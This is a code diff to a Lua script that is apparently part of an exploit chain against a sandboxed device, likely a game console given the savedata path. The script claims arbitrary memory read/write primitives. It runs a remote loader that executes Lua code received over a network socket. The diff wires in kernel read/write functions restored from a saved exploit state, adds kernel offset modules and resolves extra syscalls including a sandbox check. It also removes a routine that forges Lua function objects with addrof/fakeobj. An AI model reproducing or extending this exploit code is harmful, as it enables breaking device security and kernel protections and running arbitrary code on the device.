@@ -24,6 +24,8 @@ libc_addrofs = nil
 native_cmd_handler = nil
 native_invoke = nil
 
+kernel_offset = nil
+
 old_print = print
 function print(...)
     local out = prepare_arguments(...) .. "\n"
@@ -34,6 +36,7 @@ end
 
 package.path = package.path .. ";/savedata0/?.lua"
 
+require "globals"
 require "offsets"
 require "misc"
 require "bit32"
@@ -46,6 +49,8 @@ require "syscall"
 require "signal"
 require "native"
 require "thread"
+require "kernel_offset"
+require "kernel"
 
 function run_lua_code(lua_code, client_fd)
 
@@ -83,13 +88,6 @@ function remote_lua_loader(port)
 
     assert(port)
 
-    local AF_INET = 2
-    local SOCK_STREAM = 1
-    local INADDR_ANY = 0
-
-    local SOL_SOCKET = 0xffff  -- options for socket level
-    local SO_REUSEADDR = 4  -- allow local address reuse
-
     local enable = memory.alloc(4)
     local sockaddr_in = memory.alloc(16)
     local addrlen = memory.alloc(8)
@@ -109,10 +107,8 @@ function remote_lua_loader(port)
         error("setsockopt() error: " .. get_error_string())
     end
 
-    local htons = function(x)
-        local high = math.floor(x / 256) % 256
-        local low = x % 256
-        return low * 256 + high
+    local function htons(port)
+        return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
     end
 
     memory.write_byte(sockaddr_in + 1, AF_INET)
@@ -211,24 +207,32 @@ function remote_lua_loader(port)
             syscall.write(client_fd, err, #err)
             syscall.close(client_fd)
         end
+
+        -- init kernel r/w class if exploit state exists
+        if not kernel.rw_initialized then
+
+            local state = storage.get("kernel_rw")
+            
+            if state then
+
+                kernel_offset = get_kernel_offset() 
+        
+                ipv6_kernel_rw.data = state.ipv6_kernel_rw_data
+                
+                kernel.copyout = ipv6_kernel_rw.copyout
+                kernel.copyin = ipv6_kernel_rw.copyin
+                kernel.read_buffer = ipv6_kernel_rw.read_buffer
+                kernel.write_buffer = ipv6_kernel_rw.write_buffer
+
+                kernel.addr = state.kernel_addr
+                kernel.rw_initialized = true
+            end
+        end
+
     end
 
     syscall.close(sock_fd)
 end
-
-
-function do_lua_fixup()
-
-    lua.fake_str_addr = nil
-
-    local prev_native_invoke_addr = lua.addrof(native_invoke)
-
-    local new_native_invoke = memory.alloc(8*5)
-    memory.memcpy(new_native_invoke, prev_native_invoke_addr, 8*5)
-    
-    native_invoke = lua.fakeobj(new_native_invoke, lua_types.LUA_TFUNCTION)
-end
-
 
 function main()
 
@@ -242,26 +246,28 @@ function main()
     native.register()
     print("[+] native handler registered")
 
-    do_lua_fixup() -- makes gc happy
-
     print("[+] arbitrary r/w primitives achieved")
 
-    -- resolve required syscalls for remote lua loader 
+    -- resolve required syscalls for remote lua loader
+    -- note: syscall resolved here will also be available in payloads
     syscall.resolve({
         read = 3,
         write = 4,
         open = 5,
         close = 6,
+        getuid = 24,
         accept = 30,
         pipe = 42,
         socket = 97,
+        connect = 98,
         bind = 104,
         setsockopt = 105,
+        getsockopt = 118,
         listen = 106,
         sysctl = 202,
         nanosleep = 240,
         sigaction = 416,
-        mmap = 477,
+        is_in_sandbox = 585,
     })
 
     -- setup signal handler
